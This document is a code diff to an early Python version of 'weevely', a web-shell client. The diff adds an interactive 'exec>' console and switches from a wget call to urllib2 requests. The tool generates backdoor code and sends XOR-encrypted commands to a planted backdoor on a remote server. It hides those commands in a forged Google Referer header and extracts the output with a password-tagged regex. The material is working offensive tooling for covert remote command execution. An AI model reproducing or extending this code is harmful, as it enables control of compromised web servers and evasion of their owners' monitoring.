@@ -1,7 +1,8 @@
 # -*- coding: utf-8 -*-
 
 from numpy import frombuffer, bitwise_xor, byte
-import getopt, sys, base64, os
+import getopt, sys, base64, os, urllib2, re
+    
 
 
 back="""
@@ -26,12 +27,13 @@ class weevely:
     #self.generate()
   
     try:
-	opts, args = getopt.getopt(sys.argv[1:], 'g:u:p:e:', ['generate', 'url', 'password', 'exec'])
+	opts, args = getopt.getopt(sys.argv[1:], 'g:u:p:e:c', ['generate', 'url', 'password', 'exec', 'console'])
     except getopt.error, msg:
 	print "Error:", msg
 	exit(2)
 
-    # process options
+    cmnd=False;
+    console=False;
     for o, a in opts:
 	if o in ("-g", "-generate"):
 	  print "+ generating backdoor code in", a
@@ -42,12 +44,14 @@ class weevely:
 	if o in ("-e", "-exec"):
 	  cmnd=a
 	  mode=0
-	else:
-	  print "+ wrong options"
-	    
+	if o in ("-c", "-console"):
+	  console=True
+	  mode=0
 	   
     if cmnd: 
       self.execute(url,pwd,cmnd,mode)
+    if console:
+      self.console(url,pwd,mode)
      
   def crypt(self, text, key):
     #return (($text ^ str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));
@@ -60,19 +64,29 @@ class weevely:
     return toret 
 
   def execute(self, url, pwd, cmnd, mode):
-    print "+ execute command", cmnd, url, pwd
     cmdstr=self.crypt(cmnd,pwd)
-    wgetstr='wget --referer "http://www.google.com/asdsds?dsa=c4m4ll0&asd=' + cmdstr + '&asdsad=' + str(mode) + '" ' + url + ' -O - -q'
-    print wgetstr
-    os.system(wgetstr)
+    refurl='http://www.google.com/asdsds?dsa=c4m4ll0&asd=' + cmdstr + '&asdsad=' + str(mode)
+    ret=self.execHTTPGet(refurl,url)
+    restring='<' + pwd + '>(.*)</' + pwd + '>'
+    e = re.compile(restring,re.DOTALL)
+    print e.findall(ret)[0]
     
-
-
-
+  def execHTTPGet(self, refurl, url):
+    req = urllib2.Request(url)
+    req.add_header('Referer', refurl)
+    r = urllib2.urlopen(req)
+    return r.read()
+    
+  def console(self, url, pwd, mode):
+    while True:
+      print "exec> ",
+      cmnd = sys.stdin.readline()
+      self.execute(url, pwd, cmnd, mode)
+    
 if __name__ == "__main__":
     
     app=weevely()
     app.main()
     
     
-    
+   
